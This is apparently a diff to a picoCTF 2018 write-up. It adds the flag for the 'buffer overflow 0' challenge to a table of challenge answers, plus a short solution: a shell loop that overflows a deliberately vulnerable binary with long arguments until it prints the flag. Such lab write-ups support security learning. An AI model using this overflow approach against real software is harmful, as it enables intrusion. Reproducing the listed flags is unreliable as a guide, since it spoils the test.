@@ -37,7 +37,7 @@ Reading between the eyes     Forensics        150
 Recovering from the snap     Forensics        150     picoCTF{th3_5n4p_happ3n3d}
 admin panel                  Forensics        150     picoCTF{n0ts3cur3_894a6546}
 assembly-0                   Reversing        150
-buffer overflow 0            Binary Exploit   150
+buffer overflow 0            Binary Exploit   150     picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
 caesar cipher 1              Cryptography     150     picoCTF{justagoodoldcaesarcipherwoyolfpu}
 environ                      General Skills   150     picoCTF{eNv1r0nM3nT_v4r14Bl3_fL4g_3758492}
 hertz                        Cryptography     150     substitution_ciphers_are_solvable_mwettfesvn
@@ -1035,10 +1035,46 @@ int main(int argc, char **argv){
 ```
 
 **Solution**
+I initially compiled the code locally, found that `-fno-stack-protector` was
+required to disable stack smashing detection. Found the number of `a`s required
+to trigger a segfault, tried on server, nada. It required more As. I copied the
+binary off of the server and tried running it and thought I'd start gdb'ing it,
+but in the end I figured I'd try the lazy thing first:
+
+```
+hxr@pico-2018-shell-1:/problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631$ for i in {a..z}; do ./vuln  aaaaaaaaaaaaaaaaaaaaaaa$i; done;
+Segmentation fault
+Segmentation fault
+Segmentation fault
+Segmentation fault
+Segmentation fault
+picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
+Thanks! Received: aaaaaaaaaaaaaaaaaaaaaaafSegmentation fault
+Segmentation fault
+Segmentation fault
+Segmentation fault
+Segmentation fault
+picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
+Thanks! Received: aaaaaaaaaaaaaaaaaaaaaaalSegmentation fault
+Segmentation fault
+Segmentation fault
+Segmentation fault
+Segmentation fault
+Segmentation fault
+picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
+Thanks! Received: aaaaaaaaaaaaaaaaaaaaaaasSegmentation fault
+Segmentation fault
+picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
+Thanks! Received: aaaaaaaaaaaaaaaaaaaaaaavSegmentation fault
+Segmentation fault
+Segmentation fault
+picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
+Thanks! Received: aaaaaaaaaaaaaaaaaaaaaaazhxr@pico-2018-shell-1:/problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631$
+```
 
 **Flag**
 ```
-
+picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
 ```
 
 ## Cryptography 150: caesar cipher 1
